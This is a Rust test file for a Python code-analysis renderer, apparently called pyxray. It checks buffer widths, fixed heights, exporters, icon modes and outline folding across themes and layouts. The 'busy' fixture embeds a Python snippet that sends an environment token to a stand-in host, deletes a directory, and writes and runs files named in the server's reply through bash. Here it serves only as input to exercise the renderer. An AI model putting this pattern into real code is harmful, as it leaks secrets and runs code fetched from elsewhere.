//! The renderer's contract: it draws something sensible for every combination
//! of theme, layout and width, and it never panics or spills outside the
//! buffer it was given. Panels clip; that is the whole point of `canvas`.

use pyxray_core::xray;
use pyxray_render::export::{self, Format};
use pyxray_render::layout::{self, Layout};
use pyxray_render::panels::{Icons, Opts};
use pyxray_render::theme::THEMES;

const SAMPLES: &[(&str, &str)] = &[
    ("empty", ""),
    ("tiny", "print(1)\n"),
    (
        "broken",
        "def f(:\n    x = [1,\n",
    ),
    (
        "wide",
        "x = \"\u{65e5}\u{672c}\u{8a9e}\u{306e}\u{30c6}\u{30ad}\u{30b9}\u{30c8}\"\nprint(f\"\u{2192} {x}\")\n",
    ),
    (
        "busy",
        "import os, subprocess, shutil, requests\n\
         TOKEN = os.environ[\"T\"]\n\
         shutil.rmtree(\"/tmp/x\")\n\
         r = requests.post(\"https://h/\", json={\"t\": TOKEN})\n\
         for name in r.json():\n\
         \x20   with open(name, \"w\") as fh:\n\
         \x20       fh.write(name)\n\
         \x20   subprocess.run(f\"bash {name}\", shell=True)\n",
    ),
];

#[test]
fn every_combination_stays_inside_its_buffer() {
    for (label, source) in SAMPLES {
        let report = xray(source, label);
        for theme in THEMES {
            for l in Layout::all() {
                for width in [24u16, 32, 60, 100, 180] {
                    let buf = layout::render(&report, theme, &Opts::default(), l, width, None);
                    assert_eq!(
                        buf.area.width,
                        width.max(24),
                        "{label}/{}/{}/{width}: buffer width changed",
                        theme.id,
                        l.id()
                    );
                    assert!(
                        buf.area.height >= 1,
                        "{label}/{}/{}/{width}: empty buffer",
                        theme.id,
                        l.id()
                    );
                }
            }
        }
    }
}

#[test]
fn plain_text_never_exceeds_the_requested_width() {
    for (label, source) in SAMPLES {
        let report = xray(source, label);
        for theme in THEMES {
            for l in Layout::all() {
                for width in [32u16, 78, 120] {
                    let buf = layout::render(&report, theme, &Opts::default(), l, width, None);
                    let text = export::to_text(&buf);
                    for (i, line) in text.lines().enumerate() {
                        let w = unicode_width::UnicodeWidthStr::width(line);
                        assert!(
                            w <= width as usize,
                            "{label}/{}/{}/{width}: line {i} is {w} wide:\n{line}",
                            theme.id,
                            l.id()
                        );
                    }
                }
            }
        }
    }
}

#[test]
fn a_fixed_height_is_honoured_exactly() {
    let report = xray(SAMPLES[4].1, "busy");
    for l in Layout::all() {
        for height in [6u16, 12, 40] {
            let buf = layout::render(&report, &THEMES[0], &Opts::default(), l, 100, Some(height));
            assert_eq!(buf.area.height, height, "{}/{height}", l.id());
        }
    }
}

#[test]
fn every_exporter_produces_output() {
    let report = xray(SAMPLES[4].1, "busy");
    for theme in THEMES {
        let buf = layout::render(&report, theme, &Opts::default(), Layout::Card, 90, None);
        for format in [Format::Ansi, Format::Text, Format::Html, Format::Svg] {
            let out = export::emit(&buf, theme, format, "busy");
            assert!(!out.trim().is_empty(), "{}/{format:?} was empty", theme.id);
        }
        let html = export::to_html_fragment(&buf, theme);
        assert_eq!(
            html.matches("<span").count(),
            html.matches("</span>").count(),
            "{}: unbalanced spans",
            theme.id
        );
        let svg = export::to_svg(&buf, theme, "busy");
        assert!(svg.starts_with("<svg"), "{}: not an svg", theme.id);
        assert!(svg.ends_with("</svg>\n"), "{}: truncated svg", theme.id);
    }
}

#[test]
fn icon_modes_all_render() {
    let report = xray(SAMPLES[4].1, "busy");
    for icons in [Icons::Glyph, Icons::Tag, Icons::Both] {
        let opts = Opts {
            icons,
            ..Opts::default()
        };
        let buf = layout::render(&report, &THEMES[0], &opts, Layout::Card, 100, None);
        let text = export::to_text(&buf);
        assert!(
            text.contains("delete") || text.contains('\u{2715}'),
            "{icons:?}"
        );
    }
}

#[test]
fn folding_the_outline_reports_what_it_hid() {
    let report = xray(SAMPLES[4].1, "busy");
    let opts = Opts {
        max_depth: 1,
        ..Opts::default()
    };
    let buf = layout::render(&report, &THEMES[0], &opts, Layout::Flow, 100, None);
    let text = export::to_text(&buf);
    assert!(text.contains("hidden"), "no fold marker:\n{text}");
}
